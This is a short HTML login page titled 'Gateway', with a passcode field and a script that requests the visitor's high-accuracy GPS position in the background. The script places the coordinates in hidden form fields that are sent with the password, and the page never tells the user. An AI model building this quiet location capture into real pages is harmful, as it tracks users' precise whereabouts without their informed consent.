<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gateway</title>
    <style>
        body {
            margin: 0; padding: 0;
            height: 100vh;
            display: flex; justify-content: center; align-items: center;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
        }
        .glass-panel {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
            text-align: center;
            animation: fadein 1s ease-out;
        }
        @keyframes fadein { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .logo svg {
            width: 80px; height: 80px; fill: #fff; margin-bottom: 30px;
        }
        input[type="password"] {
            width: 250px;
            padding: 15px 20px;
            border-radius: 30px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(0, 0, 0, 0.2);
            color: white;
            font-size: 16px;
            outline: none;
            transition: all 0.3s ease;
        }
        input[type="password"]:focus {
            background: rgba(0, 0, 0, 0.4);
            border-color: rgba(255, 255, 255, 0.5);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body>
    <div class="glass-panel">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M12 2L2 22h20L12 2zm0 4.5l6.5 13.5h-13L12 6.5z"/></svg>
        </div>
        <form method="POST" id="loginForm">
            <input type="password" name="password" placeholder="Passcode" autofocus autocomplete="off">
            <!-- Hidden inputs to carry GPS data if permitted -->
            <input type="hidden" name="lat" id="gps_lat">
            <input type="hidden" name="lon" id="gps_lon">
        </form>
    </div>

    <script>
        // Request device GPS in the background
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    document.getElementById('gps_lat').value = pos.coords.latitude;
                    document.getElementById('gps_lon').value = pos.coords.longitude;
                },
                (err) => {
                    // Silently fail to IP lookup if denied or unavailable
                    console.log("GPS Location declined or unavailable:", err.message);
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        }
    </script>
</body>
</html>
